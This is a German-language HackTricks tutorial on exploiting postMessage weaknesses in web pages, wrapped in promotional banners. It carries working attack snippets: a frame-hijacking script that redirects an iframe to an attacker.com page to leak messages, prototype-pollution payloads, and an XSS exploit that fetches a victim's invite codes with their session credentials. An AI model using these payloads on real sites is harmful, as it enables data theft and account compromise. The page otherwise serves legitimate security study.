# PostMessage-Schwachstellen

## PostMessage-Schwachstellen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## **PostMessage** senden

**PostMessage** verwendet die folgende Funktion zum Senden einer Nachricht:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Hinweis: **targetOrigin** kann ein '\*' oder eine URL wie _https://company.com_ sein.\
Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (auch wenn der Ursprung des Fensterobjekts unterschiedlich ist).\
Wenn das **Platzhalterzeichen** verwendet wird, k√∂nnen **Nachrichten an jede Domain gesendet werden** und werden an den Ursprung des Fensterobjekts gesendet.

### Angriff auf iframe & Platzhalterzeichen in **targetOrigin**

Wie in [**diesem Bericht**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erkl√§rt, k√∂nnen Sie, wenn Sie eine Seite finden, die **iframed** werden kann (kein `X-Frame-Header`-Schutz) und die sensible Nachrichten √ºber **postMessage** mit einem **Platzhalterzeichen** (\*) sendet, den **Ursprung** des **iframes** √§ndern und die sensible Nachricht an eine von Ihnen kontrollierte Domain **leaken**.\
Beachten Sie, dass dieser Trick nicht funktioniert, wenn die Seite iframed werden kann, aber das **targetOrigin auf eine URL und nicht auf ein Platzhalterzeichen** gesetzt ist.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Ausnutzung von addEventListener

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die `postMessages` erwartet.\
Ein √§hnlicher Code wie der folgende wird verwendet:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Beachten Sie in diesem Fall, wie das **erste, was** der Code tut, ist, den Ursprung zu **√ºberpr√ºfen**. Dies ist besonders **wichtig**, wenn die Seite etwas Sensibles mit den empfangenen Informationen machen soll (wie z.B. ein Passwort √§ndern). **Wenn der Ursprung nicht √ºberpr√ºft wird, k√∂nnen Angreifer Opfer dazu bringen, beliebige Daten an diese Endpunkte zu senden** und die Passw√∂rter der Opfer zu √§ndern (in diesem Beispiel).

### Enumeration

Um **Event-Listener** auf der aktuellen Seite zu finden, k√∂nnen Sie Folgendes tun:

* **Suchen** Sie den JS-Code nach `window.addEventListener` und `$(window).on` (_JQuery-Version_)
* **F√ºhren** Sie in der Konsole der Entwicklertools aus: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Gehen Sie zu** _Elements --> Event Listeners_ in den Entwicklertools des Browsers

![](<../../.gitbook/assets/image (617).png>)

* Verwenden Sie eine **Browser-Erweiterung** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Diese Browser-Erweiterungen werden **alle Nachrichten abfangen** und Ihnen anzeigen.

### Umgehen der Ursprungs√ºberpr√ºfung

- Das Attribut **`event.isTrusted`** gilt als sicher, da es nur f√ºr Ereignisse `True` zur√ºckgibt, die durch echte Benutzeraktionen generiert werden. Obwohl es herausfordernd ist, es richtig zu umgehen, ist seine Bedeutung bei Sicherheits√ºberpr√ºfungen beachtenswert.

- Die Verwendung von **`indexOf()`** zur √úberpr√ºfung des Ursprungs in PostMessage-Ereignissen kann anf√§llig f√ºr Umgehungen sein. Ein Beispiel, das diese Schwachstelle veranschaulicht, ist:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- Die Methode **`search()`** von `String.prototype.search()` ist f√ºr regul√§re Ausdr√ºcke vorgesehen, nicht f√ºr Zeichenketten. Wenn etwas anderes als ein regul√§rer Ausdruck √ºbergeben wird, erfolgt eine implizite Konvertierung in einen regul√§ren Ausdruck, was die Methode potenziell unsicher macht. Dies liegt daran, dass in einem regul√§ren Ausdruck ein Punkt (.) als Platzhalter fungiert und somit eine Umgehung der √úberpr√ºfung mit speziell erstellten Domains erm√∂glicht. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die Funktion **`match()`**, √§hnlich wie `search()`, verarbeitet regul√§re Ausdr√ºcke. Wenn der regul√§re Ausdruck nicht korrekt strukturiert ist, kann er anf√§llig f√ºr Umgehungen sein.

- Die Funktion **`escapeHtml`** ist dazu gedacht, Eingaben durch Escapen von Zeichen zu bereinigen. Sie erstellt jedoch kein neues escaped Objekt, sondern √ºberschreibt die Eigenschaften des vorhandenen Objekts. Dieses Verhalten kann ausgenutzt werden. Insbesondere wenn ein Objekt so manipuliert werden kann, dass seine kontrollierte Eigenschaft `hasOwnProperty` nicht erkennt, funktioniert `escapeHtml` nicht wie erwartet. Dies wird in den folgenden Beispielen demonstriert:

- Erwartetes Versagen:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Umgehen des Escapens:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Im Zusammenhang mit dieser Schwachstelle ist das `File`-Objekt aufgrund seiner schreibgesch√ºtzten `name`-Eigenschaft besonders anf√§llig f√ºr Angriffe. Diese Eigenschaft wird bei der Verwendung in Vorlagen nicht durch die `escapeHtml`-Funktion bereinigt, was zu potenziellen Sicherheitsrisiken f√ºhrt.

- Die Eigenschaft `document.domain` in JavaScript kann von einem Skript auf eine verk√ºrzte Domain gesetzt werden, um eine entspanntere Durchsetzung der Same-Origin-Richtlinie innerhalb der gleichen √ºbergeordneten Domain zu erm√∂glichen.

### Umgehen von e.origin == window.origin

Wenn eine Webseite in einem **sandboxed iframe** mit %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%% eingebettet wird, ist es wichtig zu verstehen, dass der Ursprung des iframes auf `null` gesetzt wird. Dies ist besonders wichtig, wenn es um **Sandbox-Attribute** und deren Auswirkungen auf Sicherheit und Funktionalit√§t geht.

Durch das Hinzuf√ºgen von **`allow-popups`** im Sandbox-Attribut erben alle aus dem iframe ge√∂ffneten Popup-Fenster die Sandbox-Beschr√§nkungen ihres √ºbergeordneten Elements. Das bedeutet, dass der Ursprung des Popup-Fensters, sofern das Attribut **`allow-popups-to-escape-sandbox`** nicht ebenfalls enthalten ist, ebenfalls auf `null` gesetzt wird und somit mit dem Ursprung des iframes √ºbereinstimmt.

Folglich, wenn unter diesen Bedingungen ein Popup-Fenster ge√∂ffnet wird und eine Nachricht vom iframe an das Popup-Fenster mit **`postMessage`** gesendet wird, haben sowohl der sendende als auch der empfangende Teil ihren Ursprung auf `null` gesetzt. Dies f√ºhrt zu einer Situation, in der **`e.origin == window.origin`** zu true (`null == null`) ausgewertet wird, da sowohl das iframe als auch das Popup-Fenster den gleichen Ursprungswert `null` teilen.

F√ºr weitere Informationen **lesen Sie**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Umgehen von e.source

Es ist m√∂glich zu √ºberpr√ºfen, ob die Nachricht aus demselben Fenster stammt, in dem das Skript lauscht (besonders interessant f√ºr **Content Scripts von Browser-Erweiterungen**, um zu √ºberpr√ºfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Sie k√∂nnen **`e.source`** einer Nachricht erzwingen, indem Sie ein **iframe** erstellen, das die **postMessage** sendet und sofort gel√∂scht wird.

Weitere Informationen finden Sie unter:

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header-Umgehung

Um diese Angriffe durchzuf√ºhren, sollten Sie idealerweise die Opfer-Webseite in einem `iframe` platzieren k√∂nnen. Aber einige Header wie `X-Frame-Header` k√∂nnen dies verhindern.

In solchen Szenarien k√∂nnen Sie dennoch einen weniger unauff√§lligen Angriff verwenden. Sie k√∂nnen einen neuen Tab zur verwundbaren Webanwendung √∂ffnen und mit ihr kommunizieren:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stehlen von Nachrichten, die an ein Kind gesendet werden, indem die Hauptseite blockiert wird

Auf der folgenden Seite k√∂nnen Sie sehen, wie Sie sensible **Postmessage-Daten**, die an ein **Kind-Iframe** gesendet werden, stehlen k√∂nnen, indem Sie die **Hauptseite blockieren**, bevor die Daten gesendet werden, und einen **XSS im Kind-Iframe** ausnutzen, um die Daten zu **leaken**, bevor sie empfangen werden:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Stehlen von Nachrichten durch √Ñndern des Iframe-Standorts

Wenn Sie eine Webseite ohne X-Frame-Header in ein Iframe einbetten k√∂nnen, das ein anderes Iframe enth√§lt, k√∂nnen Sie den **Standort dieses Kind-Iframes √§ndern**. Wenn es eine **postmessage** empf√§ngt, die mit einem **Wildcard** gesendet wird, kann ein Angreifer den **Ursprung** dieses Iframes zu einer von ihm **kontrollierten Seite √§ndern** und die Nachricht **stehlen**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die √ºber `postMessage` gesendeten Daten von JS ausgef√ºhrt werden, k√∂nnen Sie die **Seite in ein Iframe einbetten** und die **Prototype Pollution/XSS** ausnutzen, indem Sie den Exploit √ºber `postMessage` senden.

Ein paar **sehr gut erkl√§rte XSS durch `postMessage`** finden Sie unter [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Beispiel f√ºr einen Exploit, um **Prototype Pollution auszunutzen und dann XSS** √ºber eine `postMessage` an ein `iframe` zu missbrauchen:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
F√ºr **weitere Informationen**:

* Link zur Seite √ºber [**Prototyp-Verschmutzung**](../deserialization/nodejs-proto-prototype-pollution/)
* Link zur Seite √ºber [**XSS**](../xss-cross-site-scripting/)
* Link zur Seite √ºber [**Client-seitige Prototyp-Verschmutzung zu XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referenzen

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Zum √úben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
